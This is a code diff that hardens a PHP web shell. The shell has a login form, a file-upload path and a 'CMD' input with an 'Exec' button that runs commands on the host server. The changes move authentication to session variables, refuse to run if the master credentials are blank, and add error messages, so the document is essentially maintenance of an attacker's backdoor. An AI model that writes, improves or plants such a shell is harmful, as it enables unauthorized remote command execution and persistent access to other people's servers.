@@ -1,14 +1,15 @@
 <?php
-	$loggedIn = FALSE;
+	$_SESSION['valid'] = false;
 	login();
 	
 	function displayForm() {
-		if (!$GLOBALS['loggedIn']) {
+		if (!$_SESSION['valid']) {
 			exit();
 		}
-		$output = "";
-		$host = "127.0.0.1";
-		$port = "9001";
+
+		$output = ""; # Leave this blank
+		$host = "127.0.0.1"; # host to fetch files from if not a local upload
+		$port = "9001"; 
 
 		if (isset($_FILES['fileToUpload'])) {
 			$output = "";
@@ -47,24 +48,36 @@
 						<p>CMD: <input type="text" name="cmd">
 							<input type="submit" value="Exec">
 					</form>
-					<pre>
-						$output
-					</pre>
+						<pre>
+							$output
+						</pre>
 			</body>
 		</html>
 HTML;
 	}
 
 	function login() {
+		$output = "";
+		# Ensure these credentials are set
 		$masterUser = "";
 		$masterPassword = "";
+		
+		# Exit if master creds are not set
+		if ($masterUser === "" or $masterPassword === "") {
+			$output .= "<pre>"  . "Master credentials cannot be blank. Edit source" . "</pre>";
+			exit();
+		}
+
 		if (isset($_POST['username']) && isset($_POST['password'])) {
-			# Add checks to ensure password has not been left blank
-			# Exit script if true
 			if ($_POST['username'] === $masterUser and $_POST['password'] === $masterPassword) {
-				$GLOBALS['loggedIn'] = TRUE;
+				$_SESSION['valid'] = true;
+        $_SESSION['timeout'] = time();
 				displayForm();
+			} else {
+				$output .= "<pre>"  . "Invalid credentials" . "</pre>";
 			}
+		} else {
+			$output .= "<pre>"  . "Username and password required" . "</pre>";
 		}
 		echo <<<HTML
 		<html>
@@ -74,6 +87,9 @@ HTML;
 					 <input type="password" title="username" placeholder="password" name="password"/>
 					 <button type="submit" class="btn">Login</button>
 				</form>
+					<pre>
+						$output
+					</pre>
 			 	</body>
 	 </html>
 HTML;
